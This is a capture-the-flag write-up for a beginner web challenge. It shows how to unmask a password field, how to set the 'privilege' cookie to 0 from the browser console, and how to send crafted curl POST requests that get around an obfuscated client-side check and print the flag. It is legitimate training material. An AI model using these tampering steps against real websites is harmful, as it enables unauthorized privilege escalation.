@@ -1,0 +1,89 @@
+Challenge description:
+Time for you to master the basics! Get the flag from http://web.spro.ink:3000.
+
+Prerequisite skills:
+Editing HTML elements
+Editing cookies
+Editing requests
+==========================================
+After entering the website, we can see that the password is masked by *
+To remove the masks, we can use chrome's inspect element and replace type="password" to type="text"
+==========================================
+Username: john
+Password: i_can_manipulatd_html_elements
+
+There's a typo in the password
+==============================================
+Username: john
+Password: i_can_manipulate_html_elements
+==============================================
+Your privilege level: 1
+Perform action: Do nothing/ Print flag
+[Submit]
+
+Some people may choose to change cookie before executing any actions. This can result in another problem where the flag is not print out immediately.
+Another way to change a cookie without using chrome add-on editthiscookie is to directly code javascript into the browser javascript console.
+
+  > document.cookie
+  "PHPSESSID=f3ka6da3jr7r74q1mip434jeq7; privilege=1; popunder=yes; popundr=yes; setover18=1"
+  
+  > document.cookie = "privilege=0"
+  "privilege=0"
+  
+  > document.cookie
+  "PHPSESSID=f3ka6da3jr7r74q1mip434jeq7; privilege=0; popunder=yes; popundr=yes; setover18=1"
+=================================================
+However, when selecting "Print flag" the following problem occurs. There is no flag printed.
+
+Your requested action do nothing was executed successfully.
+Your privilege level: 0
+Perform action: Do nothing/ Print flag
+[Submit]
+
+This can be overcome by using bash curl
+==================================================
+milkyway@ctf101-shell:~$ curl 'http://web.spro.ink:3000/' -H 'Cookie: PHPSESSID=ibeov5pv989n232c1f12hgfc03; privilege=0' -H 'Origin: http://web.spro.ink:3000' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en-US,en;q=0.8' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Cache-Control: max-age=0' -H 'Referer: http://web.spro.ink:3000/' -H 'Connection: keep-alive' --data 'action=do+nothing' --compressed
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+        "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+    <head>
+        <title>Login</title>
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
+    </head>
+    <body>
+        <noscript>Error: You need to enable JavaScript in order to complete this challenge.<p></noscript>
+
+                        Your requested action <u>do nothing</u> was executed successfully.<p>           <form action="" method="post">
+                        Your privilege level: 0<br>
+                        Perform action: 
+                        <select name="action" id="04jt32">
+                                <option value="do nothing">Do nothing</option>
+                                <option value="print flag">Print flag</option>
+                        </select><br>
+                        <input type="submit" value="Submit" />
+                </form>
+                <script>
+                                                var _0xb506=["\x3B\x20","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x73\x70\x6C\x69\x74","\x6C\x65\x6E\x67\x74\x68","\x73\x68\x69\x66\x74","\x3B","\x70\x6F\x70","\x23\x30\x34\x6A\x74\x33\x32","\x70\x72\x69\x76\x69\x6C\x65\x67\x65","\x30","\x64\x6F\x20\x6E\x6F\x74\x68\x69\x6E\x67","\x76\x61\x6C","\x73\x75\x62\x6D\x69\x74","\x66\x6F\x72\x6D","\x69\x64","\x72\x65\x6D\x6F\x76\x65\x41\x74\x74\x72"];function getCookie(_0x2b2dx2){var _0x2b2dx3=_0xb506[0]+ document[_0xb506[1]];var _0x2b2dx4=_0x2b2dx3[_0xb506[3]](_0xb506[0]+ _0x2b2dx2+ _0xb506[2]);if(_0x2b2dx4[_0xb506[4]]== 2){return _0x2b2dx4[_0xb506[7]]()[_0xb506[3]](_0xb506[6])[_0xb506[5]]()}}f= $(_0xb506[8]);$(_0xb506[14])[_0xb506[13]](function(){if(getCookie(_0xb506[9])== _0xb506[10]){f[_0xb506[12]](_0xb506[11])}});f[_0xb506[16]](_0xb506[15]);
+                </script>
+
+            </body>
+</html>
+
+milkyway@ctf101-shell:~$ curl 'http://web.spro.ink:3000/' -H 'Cookie: PHPSESSID=ibeov5pv989n232c1f12hgfc03; privilege=0' -H 'Origin: http://web.spro.ink:3000' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en-US,en;q=0.8' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Cache-Control: max-age=0' -H 'Referer: http://web.spro.ink:3000/' -H 'Connection: keep-alive' --data 'action=print+flag' --compressed
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+        "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+    <head>
+        <title>Login</title>
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
+    </head>
+    <body>
+        <noscript>Error: You need to enable JavaScript in order to complete this challenge.<p></noscript>
+
+                        Congratulations!<br>
+                flag{y0u_H4v3_m@5teR3d_t3h_ba5!cS}
+
+            </body>
+</html>
